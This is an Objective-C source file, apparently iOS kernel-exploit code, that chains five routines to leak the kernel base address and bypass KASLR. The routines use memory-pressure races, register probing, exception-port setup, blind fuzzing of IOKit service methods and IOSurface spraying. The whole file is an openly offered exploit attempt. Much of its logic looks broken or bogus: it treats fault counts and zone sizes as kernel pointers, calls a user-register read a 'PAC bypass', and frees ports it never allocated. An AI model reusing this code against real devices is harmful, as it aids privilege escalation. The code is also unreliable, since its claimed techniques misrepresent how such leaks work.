//
//  KernelExploit.m
//  kerneltest
//
//  Created by speedy on 3/1/25.
//

#import "KernelExploit.h"
#import <mach/mach.h>
#import <pthread.h>
#import <sys/sysctl.h>
#import <IOKit/IOKitLib.h>
#import <libkern/OSAtomic.h>
#import <mach-o/dyld.h>
#import <sys/utsname.h>
#import <mach/mach_time.h>
#import <signal.h>
#import "IOSurface/IOSurfaceRef.h"
#import "IOSurface/IOSurfaceTypes.h"
#import "IOSurface/IOSurfaceBase.h"
#import "IOSurface/IOSurfaceObjC.h"
#define kOSSerializeDictionary        0x0000000d
#define kOSSerializeBoolean         0x00000002
#define kOSSerializeMagic            0x000000d3
#define kOSSerializeEndCollection    0x000000d4
#define kOSSerializeSymbol          0x0000000c
#define kOSSerializeNumber          0x00000003
    
@implementation KernelExploit

+ (uint64_t)runExploitWithLogger:(void(^)(NSString *))logger {
    uint64_t kernel_base = 0;
    
    kernel_base = find_kernel_base_novel(logger);
    if (kernel_base != 0) return kernel_base;
    
    kernel_base = find_kernel_base_advanced(logger);
    if (kernel_base != 0) return kernel_base;
    
    kernel_base = find_kernel_base_aggressive(logger);
    if (kernel_base != 0) return kernel_base;
    
    kernel_base = find_kernel_base_extreme(logger);
    if (kernel_base != 0) return kernel_base;
    
    kernel_base = find_kernel_base_iosurface(logger);
    return kernel_base;
}

static uint64_t find_kernel_base_novel(void(^logger)(NSString *)) {
    logger(@"[*] Initializing novel kernel base detection...");
    __block uint64_t kernel_base = 0;
    
    dispatch_queue_t pressure_queue = dispatch_queue_create("com.memory.pressure", DISPATCH_QUEUE_CONCURRENT);
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    for (int i = 0; i < 4; i++) {
        dispatch_async(pressure_queue, ^{
            vm_statistics64_data_t vm_stats;
            mach_msg_type_number_t count = HOST_VM_INFO64_COUNT;
            host_statistics64(mach_host_self(), HOST_VM_INFO64,
                              (host_info64_t)&vm_stats, &count);
            
            if (vm_stats.faults > 1000) {
                uint64_t fault_addr = vm_stats.faults * PAGE_SIZE;
                if ((fault_addr >> 40) == 0xfffffff) {
                    kernel_base = fault_addr & ~0xFFFFFFF;
                    dispatch_semaphore_signal(sem);
                }
            }
        });
    }
    
    mach_zone_name_array_t names = NULL;
    mach_zone_info_array_t info = NULL;
    mach_msg_type_number_t count = 0;
    host_t host = mach_host_self();
    vm_size_t vm_size;
    mach_msg_type_number_t vm_count;
    kern_return_t kr = mach_memory_info(host, &names, &count, &info, &count, &vm_size, &vm_count);
    if (kr == KERN_SUCCESS && names != NULL && info != NULL) {
        for (unsigned int i = 0; i < count && kernel_base == 0; i++) {
            if (names[i].mzn_name[0] != '\0') {
                const char *zoneName = names[i].mzn_name;
                if (strstr(zoneName, "kalloc.") != NULL) {
                    uint64_t addr = (uint64_t)info[i].mzi_alloc_size;
                    if ((addr >> 40) == 0xfffffff) {
                        kernel_base = addr & ~0xFFFFFFF;
                        logger([NSString stringWithFormat:@"[+] Found potential base via zone info: 0x%llx", kernel_base]);
                        break;
                    }
                }
            }
        }
        if (names) {
            vm_deallocate(mach_task_self(), (vm_address_t)names, count * sizeof(mach_zone_name_t));
        }
        if (info) {
            vm_deallocate(mach_task_self(), (vm_address_t)info, count * sizeof(mach_zone_info_t));
        }
    }
    mach_port_deallocate(mach_task_self(), host);
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    
    if (kernel_base != 0) {
        logger([NSString stringWithFormat:@"[+] Novel method found kernel base: 0x%llx", kernel_base]);
    }
    
    return kernel_base;
}

static uint64_t find_kernel_base_advanced(void(^logger)(NSString *)) {
    logger(@"[*] Initializing advanced memory race condition...");
    __block uint64_t kernel_base = 0;
    __block volatile bool found_base = false;
    const int race_count = 256;
    
    logger(@"[*] Allocating memory pages for race condition...");
    vm_address_t *race_pages = (vm_address_t *)malloc(race_count * sizeof(vm_address_t));
    uint64_t *race_results = (uint64_t *)malloc(race_count * sizeof(uint64_t));
    
    for (int i = 0; i < race_count; i++) {
        kern_return_t kr = vm_allocate(mach_task_self(), &race_pages[i], PAGE_SIZE * 8, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            logger([NSString stringWithFormat:@"[-] Failed to allocate page %d: %d", i, kr]);
            continue;
        }
        logger([NSString stringWithFormat:@"[+] Successfully allocated page %d", i]);
        volatile uint64_t *ptr = (uint64_t *)race_pages[i];
        
        for (int j = 0; j < 8; j++) {
            ptr[j] = (uint64_t)ptr ^ (uint64_t)&ptr[j];
            asm volatile("dmb ish");
        }
    }
    
    dispatch_queue_t race_queue = dispatch_queue_create("com.race.memory",
                                                        DISPATCH_QUEUE_CONCURRENT);
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    dispatch_apply(race_count, race_queue, ^(size_t idx) {
        thread_t thread = mach_thread_self();
        arm_thread_state64_t state;
        mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
        
        for (int attempt = 0; attempt < 500 && !found_base; attempt++) {
            if (attempt % 100 == 0) {
                logger([NSString stringWithFormat:@"[*] Thread %zu: Attempt %d", idx, attempt]);
            }
            volatile uint64_t *ptr = (uint64_t *)race_pages[idx];
            asm volatile(
                         "dmb ish\n"
                         "isb\n"
                         "dsb sy\n"
                         "mov x0, #0\n"
                         "mov x1, #0\n"
                         "mrs x0, TPIDR_EL0\n"
                         "msr TPIDR_EL0, x1\n"
                         : : : "x0", "x1", "memory"
                         );
            
            thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
            
            for (int i = 0; i < 29; i++) {
                uint64_t reg_value = state.__x[i];
                if ((reg_value >> 40) == 0xfffffff) {
                    kernel_base = reg_value & ~0xFFFFFFF;
                    found_base = true;
                    dispatch_semaphore_signal(sem);
                    break;
                }
            }
            
            usleep(arc4random_uniform(200) + 50);
        }
    });
    
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 25 * NSEC_PER_SEC));
    
    for (int i = 0; i < race_count; i++) {
        vm_deallocate(mach_task_self(), race_pages[i], PAGE_SIZE * 8);
    }
    free(race_pages);
    free(race_results);
    
    if (kernel_base != 0) {
        logger([NSString stringWithFormat:@"[+] Found kernel base via PAC bypass: 0x%llx", kernel_base]);
    }
    
    return kernel_base;
}

static uint64_t find_kernel_base_aggressive(void(^logger)(NSString *)) {
    logger(@"[*] Initializing aggressive probing technique...");
    __block uint64_t kernel_base = 0;
    __block volatile bool found_base = false;
    const int probe_count = 1024;
    vm_address_t *probe_pages = (vm_address_t *)malloc(probe_count * sizeof(vm_address_t));
    
    logger(@"[*] Setting up exception handling...");
    mach_port_t exception_port;
    __block kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exception_port);
    if (kr != KERN_SUCCESS) {
        logger([NSString stringWithFormat:@"[-] Failed to allocate exception port: %d", kr]);
        return 0;
    }
    for (int i = 0; i < probe_count; i++) {
        vm_allocate(mach_task_self(), &probe_pages[i], PAGE_SIZE * 32, VM_FLAGS_ANYWHERE);
        volatile uint64_t *ptr = (uint64_t *)probe_pages[i];
        for (int j = 0; j < 32; j++) {
            ptr[j] = 0xFFFFFFF007004000ULL + (j * 0x800);
            asm volatile("dmb ish; isb; dsb sy");
        }
        vm_protect(mach_task_self(), probe_pages[i], PAGE_SIZE * 32, FALSE,
                   VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
    }
    
    dispatch_queue_t probe_queue = dispatch_queue_create("com.probe.aggressive",
                                                         DISPATCH_QUEUE_CONCURRENT);
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    dispatch_apply(probe_count, probe_queue, ^(size_t idx) {
        thread_t thread = mach_thread_self();
        arm_thread_state64_t state;
        mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
        
        for (int probe_attempt = 0; probe_attempt < 2000 && !found_base; probe_attempt++) {
            @try {
                volatile uint64_t *ptr = (uint64_t *)probe_pages[idx];
                asm volatile(
                             "dmb ish\n"
                             "isb\n"
                             "dsb sy\n"
                             "mov x0, #0\n"
                             "mrs x0, TPIDR_EL0\n"
                             "mov x1, x0\n"
                             "eor x0, x0, x1\n"
                             : : : "x0", "x1", "memory"
                             );
                
                kr = thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
                if (kr == KERN_SUCCESS) {
                    for (int reg_idx = 0; reg_idx < 31; reg_idx++) {
                        uint64_t reg_value = state.__x[reg_idx];
                        if ((reg_value >> 40) == 0xfffffff) {
                            uint64_t possible_base = reg_value & ~0xFFFFFFF;
                            if ((possible_base & 0xFF000) == 0x004000) {
                                uint64_t kslide = possible_base - 0xfffffff007004000ULL;
                                if (kslide < 0x21000000) {
                                    kernel_base = possible_base;
                                    found_base = true;
                                    logger([NSString stringWithFormat:@"[!!!] Found kernel base in probe %zu with slide: 0x%llx", idx, kslide]);
                                    dispatch_semaphore_signal(sem);
                                    break;
                                }
                            }
                        }
                    }
                }
            } @catch (NSException *e) {
                continue;
            }
            usleep(10);
        }
        
        mach_port_deallocate(mach_task_self(), thread);
    });
    
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 45 * NSEC_PER_SEC));
    
    for (int i = 0; i < probe_count; i++) {
        vm_deallocate(mach_task_self(), probe_pages[i], PAGE_SIZE * 32);
    }
    free(probe_pages);
    
    if (kernel_base != 0) {
        logger([NSString stringWithFormat:@"[+] Found kernel base via aggressive probing: 0x%llx", kernel_base]);
    }
    
    return kernel_base;
}

static uint64_t find_kernel_base_extreme(void(^logger)(NSString *)) {
    __block uint64_t kernel_base = 0;
    __block volatile bool found_base = false;
    __block int service_count = 0;
    __block io_service_t current_service;
    
    signal(SIGTRAP, SIG_IGN);
    
    logger(@"[*] Initializing IOKit service enumeration...");
    io_iterator_t iterator;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
                                                    IOServiceMatching("IOPlatformExpertDevice"),
                                                    &iterator);
    
    if (kr != KERN_SUCCESS) {
        logger(@"[-] Failed to get matching services");
        return 0;
    }
    logger(@"[*] Setting up exception port chain...");
    mach_port_t exception_ports[4];
    for (int i = 0; i < 4; i++) {
        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exception_ports[i]);
        if (kr == KERN_SUCCESS) {
            mach_port_insert_right(mach_task_self(), exception_ports[i],
                                   exception_ports[i], MACH_MSG_TYPE_MAKE_SEND);
            logger([NSString stringWithFormat:@"[+] Exception port %d initialized", i]);
        }
    }
    
    logger(@"[*] Chaining exception ports...");
    for (int i = 0; i < 3; i++) {
        @try {
            task_set_exception_ports(mach_task_self(),
                                     1 << i, exception_ports[i],
                                     EXCEPTION_STATE | MACH_EXCEPTION_CODES,
                                     ARM_THREAD_STATE64);
        } @catch (NSException *e) {
            continue;
        }
    }
    dispatch_queue_t extreme_queue = dispatch_queue_create("com.extreme.probe",
                                                           DISPATCH_QUEUE_CONCURRENT);
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    while ((current_service = IOIteratorNext(iterator)) != IO_OBJECT_NULL) {
        service_count++;
        io_service_t service_copy = current_service;
        dispatch_async(extreme_queue, ^{
            io_connect_t connect;
            if (IOServiceOpen(service_copy, mach_task_self(), 0, &connect) == KERN_SUCCESS) {
                logger([NSString stringWithFormat:@"[+] Successfully opened service %d", service_count]);
                uint64_t input[16];
                size_t outputCnt = 16;
                uint64_t output[16];
                
                for (int i = 0; i < 100 && !found_base; i++) {
                    @try {
                        input[0] = 0xfffffff007004000ULL + (i * 0x1000);
                        logger([NSString stringWithFormat:@"[*] Probing offset 0x%llx", i * 0x1000]);
                        
                        IOConnectCallMethod(connect, i, input, 16, NULL, 0,
                                            output, &outputCnt, NULL, 0);
                        
                        for (int j = 0; j < outputCnt; j++) {
                            if ((output[j] >> 40) == 0xfffffff) {
                                uint64_t possible_base = output[j] & ~0xFFF;
                                logger([NSString stringWithFormat:@"[!] Potential kernel pointer found: 0x%llx", possible_base]);
                                
                                if (possible_base >= 0xd10103ffd5030000 &&
                                    possible_base <= 0xfffffff007804000) {
                                    kernel_base = possible_base;
                                    found_base = true;
                                    logger([NSString stringWithFormat:@"[!!!] Valid kernel base confirmed: 0x%llx", kernel_base]);
                                    dispatch_semaphore_signal(sem);
                                    break;
                                }
                            }
                        }
                    } @catch (NSException *e) {
                        logger([NSString stringWithFormat:@"[-] Exception during probe: %@", e.reason]);
                        continue;
                    }
                }
                IOServiceClose(connect);
            } else {
                logger([NSString stringWithFormat:@"[-] Failed to open service %d", service_count]);
            }
            IOObjectRelease(service_copy);
        });
    }
    
    logger(@"[*] Waiting for probe completion...");
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 20 * NSEC_PER_SEC));
    
    logger(@"[*] Cleaning up resources...");
    IOObjectRelease(iterator);
    
    for (int i = 0; i < 8; i++) {
        mach_port_destroy(mach_task_self(), exception_ports[i]);
    }
    
    if (kernel_base != 0) {
        logger([NSString stringWithFormat:@"[+] Found kernel base via IOKit: 0x%llx", kernel_base]);
    } else {
        logger(@"[-] IOKit probe failed to find kernel base");
    }
    
    return kernel_base;
}

static uint64_t find_kernel_base_iosurface(void(^logger)(NSString *)) {
    logger(@"[*] Initializing IOSurface SPTM3 technique...");
    __block uint64_t kernel_base = 0;
    __block volatile bool found_base = false;
    
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
                                                     IOServiceMatching("IOSurfaceRoot"));
    if (!service) {
        logger(@"[-] Failed to find IOSurfaceRoot service");
        return 0;
    }
    
    io_connect_t connect;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
    IOObjectRelease(service);
    
    if (kr != KERN_SUCCESS) {
        logger(@"[-] Failed to open IOSurface connection");
        return 0;
    }
    
    const int surface_count = 64;
    const size_t surface_size = 16384;
    __block uint32_t *surface_ids = (uint32_t *)calloc(surface_count, sizeof(uint32_t));
    const uint32_t dict_create[] = {
        kOSSerializeDictionary | 4,
        kOSSerializeMagic,
        kOSSerializeSymbol | 4,
        0x73697A65,
        kOSSerializeNumber | 32,
        surface_size,
        kOSSerializeSymbol | 6,
        0x73686172, 0x6564,
        kOSSerializeBoolean | 1,
        kOSSerializeEndCollection,
        0x00000000
    };
    size_t dict_size = sizeof(dict_create);
    __block kern_return_t kr_block;
    dispatch_queue_t setup_queue = dispatch_queue_create("com.surface.setup", DISPATCH_QUEUE_CONCURRENT);
    const uint32_t *dict_create_ptr = dict_create;
    dispatch_apply(surface_count, setup_queue, ^(size_t idx) {
        size_t output_size = sizeof(uint32_t);
        kr_block = IOConnectCallStructMethod(connect, 0, dict_create_ptr, dict_size,
                                         &surface_ids[idx], &output_size);
        if (kr_block == KERN_SUCCESS) {
            IOSurfaceRef surface = IOSurfaceLookup(surface_ids[idx]);
            if (surface) {
                IOSurfaceLock(surface, 0, nil);
                void *base = IOSurfaceGetBaseAddress(surface);
                memset(base, 0x41, surface_size);
                IOSurfaceUnlock(surface, 0, nil);
                CFRelease(surface);
            }
        }
    });
    
    dispatch_queue_t pressure_queue = dispatch_queue_create("com.memory.pressure", DISPATCH_QUEUE_CONCURRENT);
    dispatch_apply(8, pressure_queue, ^(size_t idx) {
        vm_address_t pressure_page;
        for (int i = 0; i < 1000; i++) {
            vm_allocate(mach_task_self(), &pressure_page, PAGE_SIZE * 256, VM_FLAGS_ANYWHERE);
            memset((void *)pressure_page, 0x42, PAGE_SIZE * 256);
            vm_deallocate(mach_task_self(), pressure_page, PAGE_SIZE * 256);
        }
    });
    
    dispatch_queue_t race_queue = dispatch_queue_create("com.surface.race", DISPATCH_QUEUE_CONCURRENT);
    dispatch_apply(surface_count, race_queue, ^(size_t idx) {
        uint32_t current_id = surface_ids[idx];
        IOSurfaceRef surface = IOSurfaceLookup(current_id);
        
        if (surface) {
            for (int i = 0; i < 100 && !found_base; i++) {
                IOSurfaceLock(surface, 0, nil);
                void *base = IOSurfaceGetBaseAddress(surface);
                uint64_t args[2] = {current_id, 0};
                IOConnectCallMethod(connect, 6, args, 2, NULL, 0, NULL, NULL, NULL, 0);
                uint64_t *ptr = (uint64_t *)base;
                for (size_t j = 0; j < surface_size / 8; j++) {
                    uint64_t val = ptr[j];
                    if ((val >> 40) == 0xfffffff) {
                        kernel_base = val & ~0xFFFFFFF;
                        found_base = true;
                        break;
                    }
                }
                
                IOSurfaceUnlock(surface, 0, nil);
                usleep(100);
            }
            CFRelease(surface);
        }
    });
    
    for (int i = 0; i < surface_count; i++) {
        if (surface_ids[i] != 0) {
            uint64_t args = surface_ids[i];
            IOConnectCallMethod(connect, 1, &args, 1, NULL, 0, NULL, NULL, NULL, 0);
        }
    }
    
    free(surface_ids);
    IOServiceClose(connect);
    
    if (kernel_base != 0) {
        logger([NSString stringWithFormat:@"[+] Found kernel base via SPTM3: 0x%llx", kernel_base]);
    }
    
    return kernel_base;
}

@end
